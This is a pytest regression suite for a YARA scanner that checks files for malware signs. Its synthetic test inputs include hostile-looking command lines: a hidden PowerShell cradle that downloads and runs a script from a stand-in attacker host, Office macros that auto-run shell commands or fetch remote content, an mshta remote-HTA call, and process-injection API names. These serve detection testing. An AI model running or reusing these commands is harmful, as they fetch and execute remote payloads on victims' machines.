"""
Regression tests for the hardened local YARA rule set
(backend/app/security/yara/rules/demo_rules.yar) and the scanner's
graceful-degradation behavior (backend/app/security/yara/scanner.py).

All payloads below are SYNTHETIC in-memory byte strings constructed
purely to exercise a specific string/byte pattern a rule looks for.
None of them are executable, none of them are ever written to disk
or run - scan_bytes() only ever performs static YARA string/byte
matching against an in-memory bytes object.

Tests are organized per the required regression matrix:
  A. clean content            -> scanned=True, no matches
  B. PE-like content          -> expected matching rule
  C. PowerShell/obfuscation   -> expected match
  D. macro + shell/command    -> expected match
  E. script obfuscation       -> expected match
  F. oversized attachment     -> scanned=False
  G. empty/no content         -> graceful scanned=False
  H. yara-python unavailable  -> graceful scanned=False
"""
from __future__ import annotations

import pytest

from backend.app.security.yara import scanner as yara_scanner


@pytest.fixture(autouse=True)
def _reset_scanner_caches():
    """The scanner caches the yara module and the compiled ruleset as
    module-level globals (a lazy singleton - see scanner.py's module
    docstring). Reset them before and after every test so tests that
    simulate 'yara-python not installed' (test H) can't leak that
    state into other tests, and so a fresh compile is exercised."""
    yara_scanner._yara_module = None
    yara_scanner._yara_import_error = None
    yara_scanner._compiled_rules = None
    yield
    yara_scanner._yara_module = None
    yara_scanner._yara_import_error = None
    yara_scanner._compiled_rules = None


def _yara_available() -> bool:
    return yara_scanner._get_yara_module() is not None


pytestmark_yara_required = pytest.mark.skipif(
    not _yara_available(),
    reason="yara-python is not installed in this environment; scanner "
    "degradation is still tested (test G/H), but rule-matching tests "
    "(B-E) require the real yara-python package to compile/run "
    "demo_rules.yar.",
)


# ---------------------------------------------------------------------------
# A. Clean content
# ---------------------------------------------------------------------------
@pytestmark_yara_required
def test_a_clean_content_scanned_true_no_matches():
    clean = (
        b"Hi team,\n\nAttached is the quarterly report for your review. "
        b"Let me know if you have any questions.\n\nThanks,\nAlex"
    )
    result = yara_scanner.scan_bytes(clean)
    assert result["scanned"] is True
    assert result["matches"] == []
    assert result["reason"] is None


# ---------------------------------------------------------------------------
# B. PE-like content
# ---------------------------------------------------------------------------
@pytestmark_yara_required
def test_b_pe_like_content_matches_executable_indicators():
    pe_like = (
        b"MZ"
        + b"\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
        + b"\x00" * 32
        + b"This program cannot be run in DOS mode.\r\r\n$"
        + b"\x00" * 64
    )
    result = yara_scanner.scan_bytes(pe_like)
    assert result["scanned"] is True
    rule_names = {m["rule"] for m in result["matches"]}
    assert "Suspicious_Executable_Indicators" in rule_names


@pytestmark_yara_required
def test_b2_pe_process_injection_api_combo_matches():
    pe_like = (
        b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 40
        + b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00"
    )
    result = yara_scanner.scan_bytes(pe_like)
    rule_names = {m["rule"] for m in result["matches"]}
    assert "Suspicious_PE_Process_Injection_APIs" in rule_names


# ---------------------------------------------------------------------------
# C. Suspicious PowerShell / obfuscation content
# ---------------------------------------------------------------------------
@pytestmark_yara_required
def test_c_powershell_dropper_pattern_matches():
    payload = (
        b"powershell.exe -nop -w hidden -Command "
        b"IEX(New-Object Net.WebClient).DownloadString('http://example-attacker.test/p.ps1')"
    )
    result = yara_scanner.scan_bytes(payload)
    rule_names = {m["rule"] for m in result["matches"]}
    assert "Suspicious_PowerShell_Dropper" in rule_names
    assert "Suspicious_PowerShell_Hidden_Execution" in rule_names


# ---------------------------------------------------------------------------
# D. Macro + shell/command content
# ---------------------------------------------------------------------------
@pytestmark_yara_required
def test_d_macro_autoexec_shell_matches():
    payload = (
        b"Sub AutoOpen()\n"
        b'    Set objShell = CreateObject("WScript.Shell")\n'
        b'    objShell.Run "cmd.exe /c powershell.exe -enc AB..."\n'
        b"End Sub\n"
    )
    result = yara_scanner.scan_bytes(payload)
    rule_names = {m["rule"] for m in result["matches"]}
    assert "Suspicious_Macro_AutoExec_Shell" in rule_names


@pytestmark_yara_required
def test_d2_macro_autoexec_network_matches():
    payload = (
        b"Sub Document_Open()\n"
        b'    Set http = CreateObject("MSXML2.XMLHTTP")\n'
        b'    http.Open "GET", "http://example-attacker.test/payload", False\n'
        b"End Sub\n"
    )
    result = yara_scanner.scan_bytes(payload)
    rule_names = {m["rule"] for m in result["matches"]}
    assert "Suspicious_Macro_AutoExec_Network" in rule_names


# ---------------------------------------------------------------------------
# E. Script obfuscation content
# ---------------------------------------------------------------------------
@pytestmark_yara_required
def test_e_script_obfuscation_matches():
    payload = b"<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>"
    result = yara_scanner.scan_bytes(payload)
    rule_names = {m["rule"] for m in result["matches"]}
    assert "Suspicious_Script_Obfuscation" in rule_names


@pytestmark_yara_required
def test_e2_vbscript_shell_execution_matches():
    payload = b'CreateObject("WScript.Shell").Run "calc.exe", 0, False'
    result = yara_scanner.scan_bytes(payload)
    rule_names = {m["rule"] for m in result["matches"]}
    assert "Suspicious_VBScript_Shell_Execution" in rule_names


@pytestmark_yara_required
def test_e3_lolbin_remote_content_matches():
    payload = b"mshta.exe http://example-attacker.test/a.hta"
    result = yara_scanner.scan_bytes(payload)
    rule_names = {m["rule"] for m in result["matches"]}
    assert "Suspicious_LOLBin_Remote_Content" in rule_names


# ---------------------------------------------------------------------------
# F. Oversized attachment
# ---------------------------------------------------------------------------
def test_f_oversized_attachment_not_scanned(monkeypatch):
    monkeypatch.setattr(yara_scanner, "MAX_SCAN_BYTES", 10)
    oversized = b"A" * 11
    result = yara_scanner.scan_bytes(oversized)
    assert result["scanned"] is False
    assert result["matches"] == []
    assert "exceeds" in result["reason"].lower()


# ---------------------------------------------------------------------------
# G. Empty / no content
# ---------------------------------------------------------------------------
def test_g_empty_content_graceful():
    result = yara_scanner.scan_bytes(b"")
    assert result["scanned"] is False
    assert result["matches"] == []
    assert result["reason"] == "No content to scan"


def test_g2_none_content_graceful():
    result = yara_scanner.scan_bytes(None)
    assert result["scanned"] is False
    assert result["matches"] == []
    assert result["reason"] == "No content to scan"


# ---------------------------------------------------------------------------
# H. yara-python unavailable
# ---------------------------------------------------------------------------
def test_h_yara_unavailable_graceful(monkeypatch):
    def _raise_import_error():
        raise ImportError("No module named 'yara'")

    # Simulate the environment lacking yara-python by making the
    # lazy import fail, exactly as _get_yara_module() would see it.
    import builtins

    real_import = builtins.__import__

    def fake_import(name, *args, **kwargs):
        if name == "yara":
            raise ImportError("No module named 'yara'")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", fake_import)

    result = yara_scanner.scan_bytes(b"some content to scan")
    assert result["scanned"] is False
    assert result["matches"] == []
    assert "yara-python is not installed" in result["reason"]


# ---------------------------------------------------------------------------
# Regression: the documented 03_invoice_attachment.eml diagnostic must
# not change. YARA is content-based only; filename/extension tricks
# (double extension, executable extension) are attachment_analysis.py's
# job, not YARA's - so a plain "Invoice_48117.pdf.exe" with otherwise
# benign/plaintext content must NOT be turned into a fabricated YARA
# match just because the filename looks bad.
# ---------------------------------------------------------------------------
@pytestmark_yara_required
def test_invoice_attachment_content_alone_yields_no_yara_match():
    # Content is plain, non-malicious text - matches the diagnostic's
    # "Detected type: text/plain" result for this fixture.
    benign_text_content = b"This is a plain text invoice body, not a real executable."
    result = yara_scanner.scan_bytes(benign_text_content)
    assert result["scanned"] is True
    assert result["matches"] == []
